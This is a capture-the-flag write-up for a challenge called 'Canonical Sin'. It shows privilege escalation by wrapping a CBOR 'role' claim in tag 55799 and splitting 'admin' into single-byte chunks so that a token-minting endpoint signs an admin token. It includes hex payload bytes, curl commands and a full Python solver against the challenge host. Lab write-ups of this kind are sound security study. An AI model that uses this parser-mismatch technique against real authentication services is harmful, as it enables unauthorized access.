### Summary

The broker has a hidden token-minting endpoint, `POST /auth/mint`, that signs caller-supplied CBOR claims. It blocks the literal `admin` in the raw claim bytes and rejects any decoded top-level `role` that is not the text string `user`, but it treats a CBOR tag as an opaque "structured claim object" and never inspects the value inside. The vault decodes tag `55799` (self-describe CBOR) to its inner value, so `role: 55799("admin")` passes the mint while the vault reads `role == "admin"`. A token minted with that role and the `read:vault` capability opens the `flag` entry.

### Steps

1. Log in as the guest account and inspect the session token. The token has the form `b64url(header).b64url(payload).b64url(sig)`, with CBOR inside and an Ed25519 signature. `/auth/keys` publishes the public key. The payload is `{sub:"guest", iat, exp, role:"user", caps:["read:profile"]}`. The `/vault/secret/flag` entry requires `role=admin` and the `read:vault` capability.

   ```sh
   curl -s -X POST https://<host>/auth/login -H 'Content-Type: application/json' \
     -d '{"username":"guest","password":"guest123"}'
   ```

2. Confirm that the token cannot be edited by hand. The signature covers the exact transmitted header and payload bytes. Changing the role, re-encoding the CBOR, reordering or duplicating keys, or changing `alg` all return `401 bad signature`. The token therefore has to be signed by the broker itself, which means finding a broker endpoint that signs caller-chosen claims.

3. Find the hidden signing endpoint. `POST /auth/mint` is the only route that does not return 404. It needs a Bearer token and a body with `extra_claims_b64u`, the base64url encoding of a CBOR map. The broker signs `{sub, iat, exp}` merged with that map.

   ```sh
   curl -s -X POST https://<host>/auth/mint -H "Authorization: Bearer <guest-token>" \
     -H 'Content-Type: application/json' -d '{}'
   # {"error":"extra_claims_b64u required"}
   ```

   The mint applies two checks. The first rejects raw extra-claim bytes that contain the literal `admin`. The second requires map keys to be text strings and requires a top-level `role` that is either the text `user` or a "structured claim object". The second check does not look inside tagged values.

4. Get past both checks. Wrap the value in tag `55799` so that the mint treats it as an opaque object. Write `admin` as an indefinite-length text string with one byte per chunk, so the literal does not appear in the raw bytes. Add the `read:vault` capability to `caps`. The extra claims are:

   ```text
   a2                                              map with 2 entries
     64 "role" -> d9 d9f7                          tag 55799
                  7f 61 61 61 64 61 6d 61 69 61 6e ff   indefinite text "admin"
     64 "caps" -> 81 6a "read:vault"               array with one text string
   ```

   The mint accepts this and re-encodes the claim as `55799("admin")`. The vault unwraps tag 55799 and reads `role == "admin"`. The solver builds the bytes directly in `extra_claims()` and asserts that `admin` is not in the raw payload.

5. Read the flag with the minted token. The mint response contains `token`, which is passed as the Bearer token to the vault.

   ```sh
   curl -s https://<host>/vault/secret/flag -H "Authorization: Bearer <minted-token>"
   # isfcr{REDACTED}
   ```

   The solver does the whole chain in one run:

   ```sh
   python3 scripts/solve.py [host]
   ```

### Scripts

#### scripts/solve.py

Logs in as `guest`, builds the tag-55799 extra claims, calls `/auth/mint`, and reads `/vault/secret/flag` with the minted token. Standard library only. It takes an optional host argument and defaults to `isfcrpesu-canonical-sin.chals.io`. Run it as `python3 scripts/solve.py [host]`. It prints the flag body and exits with status 0 on a 200 response.

```python
#!/usr/bin/env python3
"""Canonical Sin solver.

Mints a token whose `role` is a CBOR tag-55799 (self-describe) wrapper around
"admin" and adds the `read:vault` capability, then reads the flag entry.

The auth-gw /auth/mint endpoint blocks a literal "admin" in the raw extra-claims
bytes and rejects any decoded top-level role other than "user", but it treats a
tagged CBOR item as an opaque "structured claim object". The vault decodes the
same tag as its inner value, so it sees role == "admin".

Usage: python3 solve.py [host]
Default host: isfcrpesu-canonical-sin.chals.io
"""
import base64
import json
import sys
import urllib.error
import urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "isfcrpesu-canonical-sin.chals.io"
BASE = f"https://{HOST}"

USERNAME = "guest"
PASSWORD = "guest123"


def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def itext(s):
    """CBOR indefinite-length text string, one byte per chunk (no literal 'admin')."""
    return b"\x7f" + b"".join(b"\x61" + bytes([c]) for c in s.encode()) + b"\xff"


def extra_claims():
    # {"role": 55799("admin"), "caps": ["read:vault"]}
    return (
        b"\xa2"
        b"\x64role\xd9\xd9\xf7" + itext("admin") +
        b"\x64caps\x81\x6a" + b"read:vault"
    )


def post(path, body, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    req = urllib.request.Request(BASE + path, data=json.dumps(body).encode(),
                                 method="POST", headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, json.load(r)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def get(path, token):
    req = urllib.request.Request(BASE + path,
                                 headers={"Authorization": "Bearer " + token})
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def main():
    st, resp = post("/auth/login", {"username": USERNAME, "password": PASSWORD})
    if st != 200:
        sys.exit(f"login failed: {st} {resp}")
    guest = resp["token"]

    extra = extra_claims()
    assert b"admin" not in extra, "raw bytes must not contain the filtered literal"
    st, resp = post("/auth/mint", {"extra_claims_b64u": b64e(extra)}, token=guest)
    if st != 200:
        sys.exit(f"mint failed: {st} {resp}")

    st, body = get("/vault/secret/flag", resp["token"])
    print(body)
    sys.exit(0 if st == 200 else 1)


if __name__ == "__main__":
    main()
```

### Notes

- Other CBOR tags do not work. Tags 0 and 1 are decoded as a date, and the vault fails with `error decoding datetime from epoch`. Tag 2 gives `invalid bignum value`, and tag 100 gives `invalid timestamp value`. Only tag 55799 passes the mint and is unwrapped by the vault.
- A plain `"admin"` or an indefinite-length `"admin"` at the role position is rejected by the mint with `role "admin" is not permitted`. The tag is what hides the value from that check.
- `POST /auth/login` ignores extra JSON fields, duplicate keys and prototype pollution, and only accepts `guest` / `guest123`. Privilege has to come from the mint.
- Tokens use `alg` -8 (EdDSA) only. `alg none`, algorithm confusion, and zero or empty signatures are all rejected.
- The target host is volatile. The solver takes the host as an argument, so pass the current one if the default is gone.
